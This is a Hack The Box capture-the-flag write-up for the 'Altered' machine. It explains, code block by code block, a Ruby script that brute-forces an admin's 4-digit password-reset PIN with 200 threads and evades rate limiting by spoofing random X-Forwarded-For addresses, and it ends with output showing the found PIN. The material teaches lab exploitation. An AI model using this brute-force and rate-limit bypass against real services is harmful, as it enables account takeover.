# Hack The Box. Machines. Altered

Machine write-up: https://7rocky.github.io/en/htb/altered

### `bf_pin.rb`

This script is used to perform a brute force attack on a 4-digit PIN to reset the password for user `admin`.

First of all, we need to make the necessary requests to arrive at the PIN form.

```ruby
res = Net::HTTP.get_response(URI("http://#{IP}/reset"))
token = res.body.match(/<input type="hidden" name="_token" value="(.*?)">/)[1]
cookie = get_cookie(res['Set-Cookie'])

res = Net::HTTP.post(URI("http://#{IP}/reset"), "_token=#{token}&name=#{NAME}", { 'Cookie' => cookie })
Cookie = get_cookie(res['Set-Cookie']).freeze

puts "[*] Using cookie: #{cookie}"
```

`get_cookie` is a method that takes the cookies from the response headers (`XSRF-TOKEN` and `laravel_session`) and removes the cookie parameters, so that they can be sent in the subsequent request headers:

```ruby
def get_cookie(set_cookie)
  xsrf = set_cookie.match(/(XSRF-TOKEN=.*?);/)[1]
  laravel = set_cookie.match(/(laravel_session=.*?);/)[1]
  "#{xsrf}; #{laravel}"
end
```

There is a method called `try_pin` which tests a given pin and checks if its valid or not:

```ruby
def try_pin(pin)
  data = "name=#{NAME}&pin=#{pin.to_s.rjust(4, '0')}"
  headers = { 'X-Forwarded-For' => rand_ip, 'Cookie' => Cookie }
  res = Net::HTTP.post(URI("http://#{IP}/api/resettoken"), data, headers)
  invalid = res.body.include?('Invalid')

  puts "\n[+] #{pin.to_s.rjust(4, '0')} is valid" unless invalid

  !invalid
end
```

There is a rate limir configured that can be bypassed using a random IP address on the `X-Forwarded-For` header. The method `rand_ip` returns this value:

```ruby
def rand_ip
  Array.new(4).map { SecureRandom.random_number(256) }.join('.')
end
```

Finally, we start `200` threads to perform the brute force attack in less time:

```ruby
max_threads = 200
threads = Array.new(max_threads)
tests = Array.new(max_threads)

pin = 0

while pin <= 9999
  print "[*] Trying from #{pin.to_s.rjust(4, '0')} to #{(pin + max_threads).to_s.rjust(4, '0')}...\r"

  (0...max_threads).each do |i|
    threads[i] = ->(tpin) { Thread.new { tests[i] = try_pin(tpin) } }.call(pin)
    pin += 1
  end

  threads.each(&:join)
  break if tests.any?
end
```

The process will take around three minutes. Once the PIN is found, we must take the cookie and use it in the browser:

```console
$ ruby bf_pin.rb
[*] Using cookie: XSRF-TOKEN=eyJpdiI6IkppemJMM2ozV01TeE5JbXFIbFBNc1E9PSIsInZhbHVlIjoiNks0K244K3Z1WU1HYVZjM3FsYjE5S05jMk8vejg0RUs0QjVRYkVrRFFMNjRKTE0xVUdYYUhJbyt3SkkwSU5lVVFyK1h5VmxlQUZqRjhsM1diMTRwbitmUm5PYUozN2M5VWRVRGtnWEZyd0FzUmZMTXhTbC80RWIzbmd6M1o4N04iLCJtYWMiOiJiMGQ3MGQ2YTc0ZmNkNzk4NzM1OWUzNTZhMmJjM2JiNzgxMmRmYWZjMjRmOTI2MDJkMDUwYWZiNWY1M2Q0MGJjIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjZSOGdLVmdZd1J6ZVJabklBNFRmdUE9PSIsInZhbHVlIjoiaCtXaFpHcDlsaXFBN05Ea2ZvYjYrdUZtZWluUmhVM3BjaWl2TXhXVmpTZXlSYTkybXZUNTd2YkQzNzNIc0FxYlV3b2l3Q1d1dml5SFd4QzlWUFlYY0JLb3NLVE4yaHZ1N0FGZkpEUTYzdzdnRzl5TWpGeGgwaCs0S29pQVRUREEiLCJtYWMiOiIxNTNiYmZjYTVjYThlN2QwMTQ1MzU1OWNlNmJiYjNjMzUwNzYwNjgzOGVhZDdlZjg5NzdlODY5OGM0ZDdiNzBkIiwidGFnIjoiIn0%3D
[*] Trying from 7400 to 7600...
[+] 7409 is valid
```
